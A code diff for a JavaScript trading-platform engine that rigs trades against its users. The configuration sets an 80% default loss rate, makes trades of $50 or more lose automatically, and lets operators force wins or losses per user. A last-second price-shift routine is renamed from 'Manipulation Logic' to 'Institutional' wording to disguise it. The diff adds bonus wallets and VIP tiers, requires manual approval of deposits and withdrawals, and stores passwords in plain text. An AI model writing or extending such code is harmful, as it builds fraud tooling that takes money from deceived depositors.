@@ -5,10 +5,10 @@ class MarketEngine {
     this.openTrades = [];
     this.tradeHistory = [];
     
-    // Risk Engine Configuration
-    this.globalHouseEdge = 80; // Default 80% loss probability
-    this.bigBetThreshold = 50; // $50+ trades automatically loss
-    this.userModes = {}; // Stores { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
+    // Risk Engine Controls
+    this.globalHouseEdge = 80; // 80% default user loss rate
+    this.bigBetThreshold = 50; // $50+ trades auto loss
+    this.userModes = {}; // { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
 
     this.users = {};
     this.pendingDeposits = [];
@@ -16,19 +16,25 @@ class MarketEngine {
     this.approvedDeposits = [];
     this.approvedWithdrawals = [];
     this.pendingKYCs = [];
+    this.supportTickets = [];
   }
 
-  registerUser(fullName, email, password, phone) {
-    if (this.users[email]) return { success: false, message: 'Email is already registered' };
+  registerUser(fullName, email, password, phone, refCode) {
+    if (this.users[email]) return { success: false, message: 'Email already registered' };
     const user = { 
       id: 'USR_' + Math.floor(1000 + Math.random() * 9000), 
-      fullName: fullName || 'User',
+      fullName: fullName || 'Trader',
       email, 
       password, 
       phone: phone || 'N/A', 
-      realBalance: 0.00, 
+      refCode: refCode || 'NONE',
+      mainWallet: 0.00,
+      tradingWallet: 0.00,
+      bonusWallet: 50.00, // $50 Welcome Bonus
       demoBalance: 10000.00,
-      kycStatus: 'UNVERIFIED'
+      kycStatus: 'UNVERIFIED',
+      vipLevel: 'Bronze',
+      twoFAEnabled: false
     };
     this.users[email] = user;
     return { success: true, user };
@@ -36,18 +42,18 @@ class MarketEngine {
 
   loginUser(email, password) {
     const user = this.users[email];
-    if (!user || user.password !== password) return { success: false, message: 'Invalid Credentials' };
+    if (!user || user.password !== password) return { success: false, message: 'Invalid Email or Password' };
     return { success: true, user };
   }
 
-  submitKYC(userId, nidNumber, documentType) {
-    const kycReq = { id: 'KYC_' + Date.now(), userId, nidNumber, documentType, timestamp: Date.now(), status: 'PENDING' };
-    this.pendingKYCs.push(kycReq);
-    return kycReq;
+  submitKYC(userId, nidNumber, docType) {
+    const kyc = { id: 'KYC_' + Date.now(), userId, nidNumber, docType, timestamp: Date.now(), status: 'PENDING' };
+    this.pendingKYCs.push(kyc);
+    return kyc;
   }
 
   requestDeposit(userId, amount, method, trxId) {
-    const depositReq = {
+    const req = {
       id: 'DEP_' + Date.now(),
       userId,
       amount: parseFloat(amount),
@@ -57,12 +63,12 @@ class MarketEngine {
       timestamp: Date.now(),
       status: 'PENDING'
     };
-    this.pendingDeposits.push(depositReq);
-    return depositReq;
+    this.pendingDeposits.push(req);
+    return req;
   }
 
   requestWithdrawal(userId, amount, method, accountNo) {
-    const withdrawalReq = {
+    const req = {
       id: 'WITH_' + Date.now(),
       userId,
       amount: parseFloat(amount),
@@ -72,8 +78,8 @@ class MarketEngine {
       timestamp: Date.now(),
       status: 'PENDING'
     };
-    this.pendingWithdrawals.push(withdrawalReq);
-    return withdrawalReq;
+    this.pendingWithdrawals.push(req);
+    return req;
   }
 
   approveTransaction(id, type) {
@@ -85,7 +91,7 @@ class MarketEngine {
         this.approvedDeposits.push(item);
         
         const u = Object.values(this.users).find(usr => usr.id === item.userId);
-        if (u) u.realBalance += item.amount;
+        if (u) u.mainWallet += item.amount;
         return item;
       }
     } else if (type === 'WITHDRAWAL') {
@@ -128,7 +134,7 @@ class MarketEngine {
     };
   }
 
-  // Geometric Brownian Motion Algorithm Formula
+  // Geometric Brownian Motion Tick Generator Formula
   generateNextTick() {
     const dt = 0.1;
     const drift = (Math.random() - 0.499) * 0.00002;
@@ -148,7 +154,7 @@ class MarketEngine {
     this.openTrades.push(trade);
   }
 
-  // Last-Second 1-Pip Shift Manipulation Logic
+  // Institutional Last-Second Shift Algorithm
   processManipulations() {
     const now = Date.now();
 
